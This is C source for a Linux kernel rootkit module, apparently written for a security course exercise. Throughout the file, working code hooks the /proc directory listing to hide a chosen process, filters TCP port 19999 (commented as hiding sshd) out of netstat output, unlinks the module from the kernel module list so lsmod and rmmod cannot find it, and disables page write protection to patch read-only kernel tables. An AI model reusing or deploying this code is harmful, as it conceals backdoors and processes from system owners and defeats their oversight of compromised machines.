#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/cdev.h>
#include <linux/kallsyms.h>
#include <linux/sched.h>
#include <linux/pagemap.h>
#include <linux/version.h>
#include <linux/vmalloc.h>
#include <linux/kernel.h>
#include <linux/moduleparam.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <asm/mman.h>
#include "my_tlb.h"
#include "my_mmap.h"
#include "rootkit.h"


//LARRRY, AHMAD, GILA, NATE-- We are done!

MODULE_LICENSE("Dual BSD/GPL");
#define MODULE_NAME "rootkit"

//#define ROOTKIT_DEBUG	1

#if defined(ROOTKIT_DEBUG) && ROOTKIT_DEBUG == 1
# define DEBUG(...)		printk(KERN_INFO __VA_ARGS__)
#else
# define DEBUG(...)
#endif

typedef int (*readdir_t)(struct file *, void *, filldir_t);
#define SEQ_BLOCK_SIZE 150
/*hide sshd*/
#define PORT_TO_HIDE 19999
#define PORT_PLACE 15

//Function pointers that will point to the previous functions.
readdir_t origreaddir=NULL;
filldir_t originalfilldir = NULL;

struct file_operations * orig_opTable = NULL;
static struct proc_dir_entry *proc;
int (*old_seq_show)(struct seq_file*, void *) = NULL;
int (*old_seq_show6)(struct seq_file*, void *) = NULL;

//Set HIDEPID to the parameter we added to insmod
static int HIDEPID = 0;
module_param(HIDEPID,int,0);

MODULE_LICENSE("GPL");


int new_seq_show(struct seq_file *seq, void *vp)
{
  int retval;
  retval = old_seq_show(seq, vp);

  char hex_port[12];

  //Take the port number and make it a hex string
  sprintf(hex_port,"%04X",PORT_TO_HIDE);

  char *current_seq_seg;

  /*
    The seq->count variable tells us where we can put
    the next block of seq information. So, if we find
    the hex for our port inside this block, we should
    overwrite it! Set the count back so the next block
    of seq_file info is written over this secret seq.
    The port is found at position 15 in every single
    seq buf segment; we search there.
   */

  current_seq_seg = (seq->buf) + (seq->count - SEQ_BLOCK_SIZE);
  int i;
  int is_port;
  is_port = 1;
  for(i = PORT_PLACE; i < PORT_PLACE + strlen(hex_port); i++){
    if(current_seq_seg[i] != hex_port[i-PORT_PLACE]){
      is_port = 0;
      break;
    }
  }
    
  if(is_port)
    seq->count -= SEQ_BLOCK_SIZE;
  return retval;   
}

int alteredfilldir (void *buffer, const char *name, int length, loff_t offset,
		     ino_t inode, unsigned x)
{
  //turn HIDEPID into decimal string
  char pid_str[10];
  sprintf(pid_str,"%d",HIDEPID);

  //Are we running on this pid? Then pretend it doesn't exist
  if(strcmp(name,pid_str)==0)
      return 0;
  
  //Else, it's business as usual.
  return originalfilldir(buffer, name, length, offset, inode, x);
}
 
int ourprocreaddirdir(struct file *fpointer, void *buffer, filldir_t filldir)
{
  int result = 0;
                 
  originalfilldir = filldir;
        
  result = origreaddir(fpointer,buffer,alteredfilldir);
                
  return result;
}

//Change Page RW

/*
  These functions disable/enable write protections in the
  pointers we pass them. These will be used to get around
  that annoying read-only proc_fops->readdir problem.
 */

static void setrw(void *address)
{
  //Create dummy space so that lookup_address can return its int pointer
  unsigned int level;
  //Get the address
  pte_t *p;
  p = lookup_address((unsigned long) address, &level);
  //Set the read bit to read-write
  //Without this, we ran into a write-page error when we
  if (p->pte &~ _PAGE_RW ){
    p->pte |= _PAGE_RW;
  }
}

static void setro(void *address)
{
  unsigned int level;
  pte_t *p;
  p = lookup_address((unsigned long) address, &level);
  //Unset the read bit so that it's read-only.
  p->pte = p->pte &~_PAGE_RW;
}

int swap_readdir(readdir_t *previousReaddir, readdir_t new_readdir)
{
  static struct proc_dir_entry *ptr;
  //Get the proc_dir_entry pointing to proc
  //Create a dummy process
  ptr = create_proc_entry("dummy",0444,NULL);

  //Get its parent
  ptr = ptr->parent;

  //Its parent should be proc
  if(strcmp(ptr->name, "/proc")!=0)
    return -1;

  //Set proc to the newly-found proc
  proc = ptr;
  //We don't wanna leave this dummy process lying around; nix it!
  remove_proc_entry("dummy",NULL);

  //Save the original readdir
  *previousReaddir = proc->proc_fops->readdir;

  /*
    When we tried to set readdir directly,
    we ran into some issues regarding read
    protection; that is, our rootkit spawned
    a paging error whenever we tried to
    set it. These functions take care of
    that (see comments near set_addr_r*)
   */
  setrw(proc->proc_fops);
  ((struct file_operations *)proc->proc_fops)->readdir = new_readdir;
  setro(proc->proc_fops);
  
  return 0;
}
                 
/*restore /proc's readdir*/
int restore_readdir (readdir_t previousReaddir)
{
  setrw(proc->proc_fops);
  ((struct file_operations *)proc->proc_fops)->readdir = previousReaddir;
  setro(proc->proc_fops);
        
  return 0;
}

int hide_lsmod(void){
  
  //Getting rid of list entry:
  /*
    Actually, this single line of code deserves a bit of explanation
    considering this is the sole answer we are providing for
    exercise 3 (for 25 points no less!) There is a macro called
    "THIS_MODULE" which points to a "struct module" type. The
    structure module has a list entry called "list_head"
    See http://www.makelinux.net/ldd3/chp-11-sect-5 for info about that.
    We are removing our module from this list /proc/module
    and this keeps the module insanely persistent, because you can't
    even remove rootkit by the "rmmod" command! (It looks in /proc/moudles
    but it can't find the rootkit because we removed it from the list)
   */
  //UNCOMMENT ONLY WHEN YOU'RE DONE WITH ROOTKIT
  list_del(&THIS_MODULE->list);
  return 0;
}



int swapseqshow(void){

  struct tcp_seq_afinfo *newafinfo;
  newafinfo = NULL;
  struct proc_dir_entry *newdirentry;
  newdirentry = init_net.proc_net->subdir;
  int foundTCP, tcp6_found;
  foundTCP = tcp6_found = 0;

  while((!foundTCP || !tcp6_found)){

    newafinfo = ((struct tcp_seq_afinfo*)newdirentry->data);

    if(!strcmp(newdirentry->name, "tcp")){
      foundTCP = 1;
      if(newafinfo)
        old_seq_show = (newafinfo->seq_ops).show;
    }
    else if(!strcmp(newdirentry->name, "tcp6")){
      tcp6_found = 1;
      if(newafinfo)
        old_seq_show6 = (newafinfo->seq_ops).show;
    }
    else{
      newdirentry = newdirentry->next;
      if(newdirentry)
        continue;
      else
        break;
    }

    if(newafinfo)
      (newafinfo->seq_ops).show = new_seq_show;

    newdirentry = newdirentry->next;
  }
  return 0;
}




int restoreseq(void){
  struct tcp_seq_afinfo *our_afinfo;
  our_afinfo = NULL;
  struct proc_dir_entry *direntry;
  direntry = init_net.proc_net->subdir;
  int foundTCP, tcp6_found;
  foundTCP = tcp6_found = 0;
  
  while(!foundTCP || !tcp6_found){
    
    our_afinfo = ((struct tcp_seq_afinfo*)direntry->data);
    
    if(!strcmp(direntry->name, "tcp")){
      foundTCP = 1;
      if(our_afinfo)
	(our_afinfo->seq_ops).show = old_seq_show;
    }
    if(!strcmp(direntry->name, "tcp6")){
      tcp6_found = 1;
      if(our_afinfo)
	(our_afinfo->seq_ops).show = old_seq_show6;
    }
    else{
      direntry = direntry->next;
      continue;
    }

    direntry = direntry->next;
  }
  return 0;
}

int hide_files(void){

  return 0;
}

static int rootkit_init(void)
{
	
  int rv;
  rv = 0;
  void * __end;
  __end = (void *) &unmap_page_range;

  /* Find the non-exported symbols.  'Cause you can't stop me. */
  unmap_page_range = (unmap_page_range_t)
    kallsyms_lookup_name("unmap_page_range");
  if ((!unmap_page_range) || (void *) unmap_page_range >= __end) {
    printk(KERN_ERR "Rootkit error: "
	   "can't find important function unmap_page_range\n");
    return -ENOENT;
  }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 2, 0)
  my_tlb_gather_mmu = (tlb_gather_mmu_t)
    kallsyms_lookup_name("tlb_gather_mmu");
  printk(KERN_ERR "resolved symbol tlb_gather_mmu %p\n", my_tlb_gather_mmu);
  if (!my_tlb_gather_mmu) {
    printk(KERN_ERR "Rootkit error: "
	   "can't find kernel function my_tlb_gather_mmu\n");
    return -ENOENT;
  }

  my_tlb_flush_mmu = (tlb_flush_mmu_t)
    kallsyms_lookup_name("tlb_flush_mmu");
  if (!my_tlb_flush_mmu) {
    printk(KERN_ERR "Rootkit error: "
	   "can't find kernel function my_tlb_flush_mmu\n");
    return -ENOENT;
  }

  my_tlb_finish_mmu = (tlb_finish_mmu_t)
    kallsyms_lookup_name("tlb_finish_mmu");
  if (!my_tlb_finish_mmu) {
    printk(KERN_ERR "Rootkit error: "
	   "can't find kernel function my_tlb_finish_mmu\n");
    return -ENOENT;
  }
#else
  pmmu_gathers = (struct mmu_gather *)
    kallsyms_lookup_name("mmu_gathers");
  if (!pmmu_gathers) {
    printk(KERN_ERR "Rootkit error: "
	   "can't find kernel function mmu_gathers\n");
    return -ENOENT;
  }
#endif //kernel_version >< 3.2

  kern_free_pages_and_swap_cachep = (free_pages_and_swap_cache_t)
    kallsyms_lookup_name("free_pages_and_swap_cache");
  if (!kern_free_pages_and_swap_cachep) {
    printk(KERN_ERR "Rootkit error: "
	   "can't find kernel function free_pages_and_swap_cache\n");
    return -ENOENT;
  }

  kern_flush_tlb_mm = (flush_tlb_mm_t)
    kallsyms_lookup_name("flush_tlb_mm");
  if (!kern_flush_tlb_mm) {
    printk(KERN_ERR "Rootkit error: "
	   "can't find kernel function flush_tlb_mm\n");
    return -ENOENT;
  }

  kern_free_pgtables = (free_pgtables_t)
    kallsyms_lookup_name("free_pgtables");
  if (!kern_free_pgtables) {
    printk(KERN_ERR "Rootkit error: "
	   "can't find kernel function free_pgtables\n");
    return -ENOENT;
  }

  printk(KERN_ALERT "Rootkit: Before Swap\n");
	
  //Swapping readdir
  swap_readdir(&origreaddir,ourprocreaddirdir);

  //Hiding for lsmod
  hide_lsmod();
  
  //Swapping for netstat
  swapseqshow();

  //Hide other files
  hide_files();
  
  printk(KERN_ALERT "Rootkit: After Swap\n");
  return rv;
}

static void rootkit_exit(void)
{
  restoreseq();
  
  restore_readdir(origreaddir);
  printk(KERN_ALERT "Rootkit: Goodbye, cruel world\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);



